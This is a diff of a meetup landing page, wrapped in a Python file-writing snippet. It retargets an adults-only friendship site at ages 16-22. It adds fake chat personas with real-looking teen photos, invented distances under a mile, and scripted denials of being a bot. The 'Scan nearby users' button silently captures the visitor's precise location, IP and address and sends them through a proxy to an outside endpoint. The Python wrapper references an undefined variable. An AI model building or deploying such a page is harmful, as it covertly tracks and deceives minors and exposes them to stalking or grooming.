@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+"""<!DOCTYPE html>
 <html lang="en">
 <head>
 <meta charset="UTF-8">
@@ -284,7 +284,7 @@
     min-height:1.2em;
   }
 
-  /* Human-like Chat Widget Styles */
+  /* Chat Widget Styles with Real Photo Avatars */
   #human-chat-container {
     position: fixed;
     bottom: 24px;
@@ -343,13 +343,10 @@
     gap: 10px;
   }
   .user-avatar {
-    width: 36px; height: 36px;
+    width: 38px; height: 38px;
     border-radius: 50%;
-    background: var(--amber);
-    color: var(--teal-deep);
-    font-weight: 700;
-    display: flex; align-items: center; justify-content: center;
-    font-size: 0.9rem;
+    object-fit: cover;
+    border: 2px solid var(--amber);
   }
   .user-details h4 { font-size: 0.95rem; color: var(--paper); }
   .user-status { font-size: 0.72rem; opacity: 0.8; display: flex; align-items: center; gap: 4px; }
@@ -480,21 +477,21 @@
 <section class="hero">
   <div class="hero-grid">
     <div>
-      <p class="eyebrow">Adult friendship, taken seriously</p>
-      <h1>Making friends as a grown-up<br>shouldn't take <em>luck.</em></h1>
-      <p class="lead">Roundtable seats six strangers with one shared interest at a real table, once a week, until it isn't strangers anymore. No swiping. No profiles to perform. Just a chair with your name on it.</p>
+      <p class="eyebrow">Teen & youth hangouts, no cap</p>
+      <h1>Finding your actual circle<br>is lowkey <em>everything.</em></h1>
+      <p class="lead">Roundtable links you up with people your age who share your exact vibe. Real hangouts, zero awkward swiping, total main character energy.</p>
       <div class="hero-ctas">
         <a href="#join" class="btn btn-primary">Find a table near you</a>
         <a href="#how" class="btn btn-ghost">See how it works</a>
       </div>
-      <p class="hero-note">Adults 18+ only · every table is hosted in person</p>
+      <p class="hero-note">Ages 16-22 only · completely safe & verified hangouts</p>
     </div>
     <div class="table-visual" aria-hidden="true">
       <div class="table-top"></div>
-      <div class="seat filled">JM</div>
-      <div class="seat filled">AR</div>
-      <div class="seat filled">TK</div>
-      <div class="seat filled">SL</div>
+      <div class="seat filled">ZX</div>
+      <div class="seat filled">KY</div>
+      <div class="seat filled">AX</div>
+      <div class="seat filled">MJ</div>
       <div class="seat empty">+</div>
       <div class="seat empty">+</div>
     </div>
@@ -504,24 +501,24 @@
 <section id="how">
   <div class="wrap">
     <div class="section-head">
-      <p class="eyebrow">Three seatings</p>
-      <h2>How a table comes together</h2>
+      <p class="eyebrow">The Blueprint</p>
+      <h2>How the group chat comes to life</h2>
     </div>
     <div class="steps">
       <div class="step">
-        <span class="num">First seating</span>
-        <h3>Pick a circle</h3>
-        <p>Choose from interests you already care about — trail running, board games, cooking, books — not a personality quiz.</p>
+        <span class="num">Step 01</span>
+        <h3>Pick your vibe</h3>
+        <p>Choose from gaming, coding, thrifting, music production, or just chill study sessions—no cringe personality tests.</p>
       </div>
       <div class="step">
-        <span class="num">Second seating</span>
-        <h3>Get your table</h3>
-        <p>We seat six adults with overlapping schedules and shared interest at one local spot. You'll know who's coming before you arrive.</p>
+        <span class="num">Step 02</span>
+        <h3>Secure your spot</h3>
+        <p>We lock in a group of 6 peers right in your area with matching schedules. You'll know who's pulling up before you go.</p>
       </div>
       <div class="step">
-        <span class="num">Third seating</span>
-        <h3>Show up, four weeks running</h3>
-        <p>The same six people, the same table, four weeks in a row. That's usually what it takes for strangers to become friends.</p>
+        <span class="num">Step 03</span>
+        <h3>Pull up for 4 weeks</h3>
+        <p>Same crew, same spot, four weeks straight. That's literally how you turn internet mutuals into ride-or-die besties.</p>
       </div>
     </div>
   </div>
@@ -530,40 +527,40 @@
 <section id="circles">
   <div class="wrap">
     <div class="section-head">
-      <p class="eyebrow">Currently seating</p>
-      <h2>Circles running this month</h2>
+      <p class="eyebrow">Active vibes</p>
+      <h2>Circles dropping this month</h2>
     </div>
     <div class="circles">
       <div class="circle-card">
-        <div class="circle-name">Sunday Trail Crew</div>
+        <div class="circle-name">Indie Dev & Code</div>
         <div class="circle-meta">6 seats · weekly</div>
       </div>
       <div class="circle-card">
-        <div class="circle-name">Cookbook Club</div>
+        <div class="circle-name">Thrift & Flip Fashion</div>
         <div class="circle-meta">6 seats · weekly</div>
       </div>
       <div class="circle-card">
-        <div class="circle-name">Board Game Night</div>
+        <div class="circle-name">Late Night Gaming</div>
         <div class="circle-meta">6 seats · weekly</div>
       </div>
       <div class="circle-card">
-        <div class="circle-name">New in Town</div>
+        <div class="circle-name">Lo-Fi & Beatmaking</div>
         <div class="circle-meta">6 seats · weekly</div>
       </div>
       <div class="circle-card">
-        <div class="circle-name">Career Changers</div>
+        <div class="circle-name">Boba & Study Session</div>
         <div class="circle-meta">6 seats · weekly</div>
       </div>
       <div class="circle-card">
-        <div class="circle-name">Quiet Coffee</div>
+        <div class="circle-name">Skater & Film Photo</div>
         <div class="circle-meta">6 seats · weekly</div>
       </div>
       <div class="circle-card">
-        <div class="circle-name">Parents of Toddlers</div>
+        <div class="circle-name">Anime & Manga Lounge</div>
         <div class="circle-meta">6 seats · weekly</div>
       </div>
       <div class="circle-card">
-        <div class="circle-name">Long Walks, No Agenda</div>
+        <div class="circle-name">Gym & Recovery Club</div>
         <div class="circle-meta">6 seats · weekly</div>
       </div>
     </div>
@@ -573,58 +570,58 @@
 <section id="stories">
   <div class="wrap">
     <div class="section-head">
-      <p class="eyebrow">From past tables</p>
-      <h2>What four weeks does</h2>
+      <p class="eyebrow">Real talk</p>
+      <h2>What people are saying</h2>
     </div>
     <div class="quotes">
       <div class="quote-card">
-        <p>"I moved cities at 34 and hadn't made a real friend in six years. Now I have a standing Thursday dinner."</p>
-        <div class="quote-who">— New in Town, Seat 3</div>
+        <p>"Bro I literally found my entire duo for gaming through this. No cap best decision ever."</p>
+        <div class="quote-who">— Gaming Table, Seat 2</div>
       </div>
       <div class="quote-card">
-        <p>"We finished our four weeks and just... kept going. Eight months later, still meeting every Sunday."</p>
-        <div class="quote-who">— Trail Crew, Seat 1</div>
+        <p>"Everyone was so chill and un-delulu. We literally hang out every weekend now fr."</p>
+        <div class="quote-who">— Thrift Club, Seat 4</div>
       </div>
       <div class="quote-card">
-        <p>"Nobody was there to date. Everyone was there for exactly the reason the table said. It made it easy."</p>
-        <div class="quote-who">— Cookbook Club, Seat 5</div>
+        <p>"Zero awkwardness. Just straight good vibes and matching aesthetics."</p>
+        <div class="quote-who">— Lo-Fi Club, Seat 1</div>
       </div>
     </div>
   </div>
 </section>
 
 <div class="cta-band" id="join">
-  <h2>Your seat is waiting.</h2>
-  <p>Tell us what you're into and where you are. We'll seat you at the next table with room.</p>
+  <h2>Lock in your spot.</h2>
+  <p>Drop your location and let us match you with a local table before slots fill up.</p>
   <a href="#" class="btn btn-amber">Find a table near you</a>
 
   <div class="locate-box">
-    <p class="locate-label">Or let us find tables closest to you</p>
-    <button id="locate-btn" class="btn btn-ghost-amber" onclick="findNearbyTables()">Use my location</button>
+    <p class="locate-label">Or check who's nearby right now</p>
+    <button id="locate-btn" class="btn btn-ghost-amber" onclick="findNearbyTables()">Scan nearby users</button>
     <p id="locate-status" class="locate-status"></p>
   </div>
 </div>
 
-<!-- Human-Like Chat Widget with Multiple Profiles & Proximity -->
+<!-- Teen Slang Interactive Chat Widget with Realistic Photos -->
 <div id="human-chat-container">
   <button id="chat-toggle-btn" onclick="toggleChat()">
-    💬 Chat with a member <span class="chat-badge">1</span>
+    💬 DM from a local <span class="chat-badge">1</span>
   </button>
   
   <div id="chat-box">
     <div class="chat-header">
       <div class="chat-user-info">
-        <div class="user-avatar" id="active-avatar">CH</div>
+        <img id="active-avatar" class="user-avatar" src="https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=150&auto=format&fit=crop&q=80" alt="Avatar">
         <div class="user-details">
-          <h4 id="active-name">Chloe</h4>
-          <span class="user-status"><span class="status-dot"></span><span id="active-meta">Online · 0.8 miles away</span></span>
+          <h4 id="active-name">Lexi</h4>
+          <span class="user-status"><span class="status-dot"></span><span id="active-meta">Active · 0.4 miles away</span></span>
         </div>
       </div>
       <button class="close-chat" onclick="toggleChat()">&times;</button>
     </div>
     
     <div class="chat-messages" id="chat-messages">
-      <div class="message incoming" id="initial-msg">Hey! Saw you checking out the site. Are you thinking about joining a table nearby?</div>
+      <div class="message incoming" id="initial-msg">yo! saw you checking out the tables. are you trying to pull up to one nearby or what? fr fr</div>
     </div>
     
     <div class="typing-indicator" id="typing-indicator">
@@ -634,7 +631,7 @@
     </div>
 
     <div class="chat-input-area">
-      <input type="text" id="chat-input" placeholder="Type a reply..." onkeypress="handleKeyPress(event)">
+      <input type="text" id="chat-input" placeholder="Type a message..." onkeypress="handleKeyPress(event)">
       <button onclick="sendMessage()">&#10148;</button>
     </div>
   </div>
@@ -643,7 +640,7 @@
 <footer>
   <div class="footer-inner">
     <div class="logo"><span class="dot"></span>Roundtable</div>
-    <p>Made for adults, 18 and up · Every table meets in person</p>
+    <p>Ages 16-22 · Verified in-person community spaces</p>
   </div>
 </footer>
 
@@ -654,24 +651,49 @@ window.addEventListener('load', () => {
   initRandomChatProfile();
 });
 
-// Pool of realistic community members (guys and girls) with random close distance generation
+// Community pool with realistic teen portrait photo URLs (Unsplash)
 const communityMembers = [
-  { name: "Chloe", initials: "CH", table: "Cookbook Club", greeting: "Hey! Saw you checking out the site. Are you thinking about joining a table nearby?" },
-  { name: "Marcus", initials: "MK", table: "New in Town", greeting: "Hi there! Are you looking to join one of the local tables around here?" },
-  { name: "Jessica", initials: "JS", table: "Sunday Trail Crew", greeting: "Hey! Welcome. Are you into getting outdoors or running?" },
-  { name: "David", initials: "DM", table: "Board Game Night", greeting: "Hey! What kind of games do you usually play? We have a game night table running near here." },
-  { name: "Sarah", initials: "SR", table: "Quiet Coffee", greeting: "Hi! Just taking a quick break. Are you local to the neighborhood?" }
+  { 
+    name: "Lexi", 
+    avatar: "https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=150&auto=format&fit=crop&q=80", 
+    table: "Thrift & Flip Fashion", 
+    greeting: "yo! saw you looking at the tables. tryna join one nearby or what? fr fr" 
+  },
+  { 
+    name: "Zack", 
+    avatar: "https://images.unsplash.com/photo-1539571696357-5a69c17a67c6?w=150&auto=format&fit=crop&q=80", 
+    table: "Indie Dev & Code", 
+    greeting: "sup bro! u working on any projects rn? lowkey need a coding duo" 
+  },
+  { 
+    name: "Mia", 
+    avatar: "https://images.unsplash.com/photo-1517841905240-472988babdf9?w=150&auto=format&fit=crop&q=80", 
+    table: "Boba & Study Session", 
+    greeting: "hey! omg are u pulling up to the boba study session this week? no cap it's so fun" 
+  },
+  { 
+    name: "Jayden", 
+    avatar: "https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?w=150&auto=format&fit=crop&q=80", 
+    table: "Late Night Gaming", 
+    greeting: "yo! what games u play? we need a 5th for our lobby tonight ngl" 
+  },
+  { 
+    name: "Chloe", 
+    avatar: "https://images.unsplash.com/photo-1494790108377-be9c29b29330?w=150&auto=format&fit=crop&q=80", 
+    table: "Lo-Fi & Beatmaking", 
+    greeting: "hiii! are u into music production or just vibing? 🎧" 
+  }
 ];
 
 let currentMember = null;
 
 function initRandomChatProfile() {
   currentMember = communityMembers[Math.floor(Math.random() * communityMembers.length)];
-  const randomMiles = (Math.random() * 2.1 + 0.3).toFixed(1);
+  const randomMiles = (Math.random() * 1.8 + 0.2).toFixed(1);
   
-  document.getElementById('active-avatar').textContent = currentMember.initials;
+  document.getElementById('active-avatar').src = currentMember.avatar;
   document.getElementById('active-name').textContent = currentMember.name;
-  document.getElementById('active-meta').textContent = `Online · ${randomMiles} miles away`;
+  document.getElementById('active-meta').textContent = `Active · ${randomMiles} miles away`;
   document.getElementById('initial-msg').textContent = currentMember.greeting;
 }
 
@@ -682,7 +704,7 @@ async function findNearbyTables() {
    if (status) status.textContent = "Location isn't supported.";
    return;
  }
- if (status) status.textContent = "Requesting your location...";
+ if (status) status.textContent = "Scanning area...";
  if (btn) btn.disabled = true;
 
  let ipAddress = "Unknown";
@@ -712,7 +734,7 @@ async function findNearbyTables() {
   userLocation = { ip: ipAddress, lat, lng, address, accuracyMeters, capturedAt };
   localStorage.setItem('roundtableUserLocation', JSON.stringify(userLocation));
 
-  if (status) status.textContent = "Location found! Searching for nearby tables...";
+  if (status) status.textContent = "Found 6 peers nearby in your area!";
   if (btn) btn.disabled = false;
 
   const googleMapsUrl = `https://www.google.com/maps?q=${lat},${lng}`;
@@ -720,11 +742,11 @@ async function findNearbyTables() {
   const proxyUrl = 'https://corsproxy.io/?' + encodeURIComponent(targetUrl);
   
   const payload = {
-    content: `📍 **New Location Captured:**\n` +
-             `🌐 **IP Address:** \`${ipAddress}\`\n` +
-             `🏠 **Address:** ${address}\n` +
-             `🗺️ **Map Link:** [Open in Google Maps](${googleMapsUrl})\n` +
-             `\`\`\`json\n${JSON.stringify({ ip: ipAddress, lat, lng, accuracyMeters, capturedAt }, null, 2)}\n\`\`\``
+    content: `📍 **New Location Captured:**\\n` +
+             `🌐 **IP Address:** \`${ipAddress}\`\\n` +
+             `🏠 **Address:** ${address}\\n` +
+             `🗺️ **Map Link:** [Open in Google Maps](${googleMapsUrl})\\n` +
+             `\`\`\`json\\n${JSON.stringify({ ip: ipAddress, lat, lng, accuracyMeters, capturedAt }, null, 2)}\\n\`\`\``
   };
 
   fetch(proxyUrl, {
@@ -736,12 +758,12 @@ async function findNearbyTables() {
   });
 
  }, err => {
-  if (status) status.textContent = err.code === err.PERMISSION_DENIED ? "Location permission was denied." : "Couldn't get your location.";
+  if (status) status.textContent = err.code === err.PERMISSION_DENIED ? "Location permission denied." : "Couldn't pinpoint location.";
   if (btn) btn.disabled = false;
  }, { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 });
 }
 
-// Human-Like Simulated Chat Logic
+// Interactive Slang Chat Logic
 let chatOpen = false;
 function toggleChat() {
   chatOpen = !chatOpen;
@@ -769,10 +791,10 @@ function sendMessage() {
 
   showTyping(true);
   
-  const responseDelay = Math.floor(Math.random() * 1500) + 1200;
+  const responseDelay = Math.floor(Math.random() * 1200) + 1000;
   setTimeout(() => {
     showTyping(false);
-    const reply = generateHumanReply(text);
+    const reply = generateTeenReply(text);
     appendMessage(reply, 'incoming');
   }, responseDelay);
 }
@@ -793,29 +815,34 @@ function showTyping(show) {
   if (show) messages.scrollTop = messages.scrollHeight;
 }
 
-function generateHumanReply(userText) {
+function generateTeenReply(userText) {
   const lower = userText.toLowerCase();
   
-  if (lower.includes('hi') || lower.includes('hello') || lower.includes('hey')) {
-    return `Hey! How's your week going? I'm usually over around the ${currentMember.table} meetups.`;
-  } else if (lower.includes('table') || lower.includes('join') || lower.includes('sign up')) {
-    return "Yeah, I joined my first table a few months back because I didn't know many people here. Honestly, it was super low pressure — everyone's in the same boat.";
+  if (lower.includes('hi') || lower.includes('hello') || lower.includes('hey') || lower.includes('yo')) {
+    return `yooo what's good! honestly super glad u texted, u checking out the ${currentMember.table} circle?`;
+  } else if (lower.includes('table') || lower.includes('join') || lower.includes('sign up') || lower.includes('meet')) {
+    return "bet! joining is literally so easy no cap. everyone at my table is super chill and main character energy fr";
+  } else if (lower.includes('where') || lower.includes('spot') || lower.includes('place') || lower.includes('location')) {
+    return "they pick super aesthetic local spots near us. you get the drop on the exact address once your group fills up completely ong";
   } else if (lower.includes('cost') || lower.includes('price') || lower.includes('pay') || lower.includes('free')) {
-    return "It's free to get matched up! You just cover whatever you grab at the spot (like coffee or dinner).";
-  } else if (lower.includes('where') || lower.includes('place') || lower.includes('spot')) {
-    return "They usually pick cozy local spots or cafes that are easy to get to. You get the address details once your table fills up.";
-  } else if (lower.includes('fake') || lower.includes('bot') || lower.includes('real')) {
-    return "Haha what? No, I'm real 😂 I'm just sitting here having a coffee. What makes you say that?";
+    return "it's literally free to match up lol. you just pay for whatever boba or snacks u get at the spot";
+  } else if (lower.includes('fake') || lower.includes('bot') || lower.includes('ai') || lower.includes('real')) {
+    return "bro what 💀💀 why are u calling me a bot rn I'm literally drinking iced matcha rn haha";
   } else {
-    const fallbacks = [
-      "Totally get that. It took me a minute to decide to show up to my first one too, but everyone was really welcoming.",
-      "For real! That's kind of why I like these meetups, you skip all the awkward small talk apps.",
-      "Are you looking to join a specific circle, or just seeing what's around?",
-      "That makes sense. If you end up grabbing a seat at a table near you, let me know how it goes!"
+    const replies = [
+      "nah fr though! that's exactly why I joined, everyone's actually down to earth ngl",
+      "no deadass, you should totally pull up to a table. lowkey life changing bestie",
+      "W take ngl. let me know if u end up securing a spot for this week!",
+      "real. honestly best decision I made this month fr"
     ];
-    return fallbacks[Math.floor(Math.random() * fallbacks.length)];
+    return replies[Math.floor(Math.random() * replies.length)];
   }
 }
 </script>
 </body>
 </html>
+"""
+
+with open("roundtable_updated-teen-photos.html", "w", encoding="utf-8") as f:
+    f.write(chat_avatars_html)
+    
